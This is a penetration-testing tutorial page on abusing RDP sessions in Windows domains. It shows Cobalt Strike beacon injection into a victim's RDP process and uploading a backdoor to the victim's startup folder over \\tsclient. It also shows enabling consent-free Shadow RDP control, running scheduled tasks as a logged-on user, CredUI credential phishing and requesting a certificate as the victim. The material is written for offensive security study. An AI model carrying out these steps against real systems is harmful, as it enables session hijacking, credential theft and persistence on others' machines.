# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

If the **external group** has **RDP access** to any **computer** in the current domain, an **attacker** could **compromise that computer and wait for him**.

Once that user has accessed via RDP, the **attacker can pivot to that users session** and abuse its permissions in the external domain.

```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```

Check **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

If a user access via **RDP into a machine** where an **attacker** is **waiting** for him, the attacker will be able to **inject a beacon in the RDP session of the user** and if the **victim mounted his drive** when accessing via RDP, the **attacker could access it**.

In this case you could just **compromise** the **victims** **original computer** by writing a **backdoor** in the **statup folder**.

```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     02/20/2021 10:15:23   Config.Msi
          dir     10/18/2016 01:59:39   Documents and Settings
          [...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```

## Shadow RDP

If you are **local admin** on a host where the victim already has an **active RDP session**, you may be able to **view/control that desktop without stealing the password or dumping LSASS**.

This depends on the **Remote Desktop Services shadowing** policy stored in:

```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```

Interesting values:

- `0`: Disabled
- `1`: `EnableInputNotify` (control, user approval required)
- `2`: `EnableInputNoNotify` (control, **no user approval**)
- `3`: `EnableNoInputNotify` (view-only, user approval required)
- `4`: `EnableNoInputNoNotify` (view-only, **no user approval**)

```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```

This is especially useful when a privileged user connected over RDP left an unlocked desktop, KeePass session, MMC console, browser session, or admin shell open.

## Scheduled Tasks As Logged-On User

If you are **local admin** and the target user is **currently logged on**, Task Scheduler can start code **as that user without their password**.

This turns the victim's existing logon session into an execution primitive:

```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```

Notes:

- If the user is **not logged on**, Windows usually requires the password to create a task that runs as them.
- If the user **is logged on**, the task can reuse the existing logon context.
- This is a practical way to execute GUI actions or launch binaries inside the victim session without touching LSASS.

## CredUI Prompt Abuse From the Victim Session

Once you can execute **inside the victim's interactive desktop** (for example via **Shadow RDP** or **a scheduled task running as that user**), you can display a **real Windows credential prompt** using CredUI APIs and harvest credentials entered by the victim.

Relevant APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Typical flow:

1. Spawn a binary in the victim session.
2. Display a domain-authentication prompt that matches the current domain branding.
3. Unpack the returned auth buffer.
4. Validate the provided credentials and optionally keep prompting until valid credentials are entered.

This is useful for **on-host phishing** because the prompt is rendered by standard Windows APIs instead of a fake HTML form.

## Requesting a PFX In the Victim Context

The same **scheduled-task-as-user** primitive can be used to request a **certificate/PFX as the logged-on victim**. That certificate can later be used for **AD authentication** as that user, avoiding password theft entirely.

High-level flow:

1. Gain **local admin** on a host where the victim is logged on.
2. Run enrollment/export logic as the victim using a **scheduled task**.
3. Export the resulting **PFX**.
4. Use the PFX for PKINIT / certificate-based AD authentication.

See the AD CS pages for follow-up abuse:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}


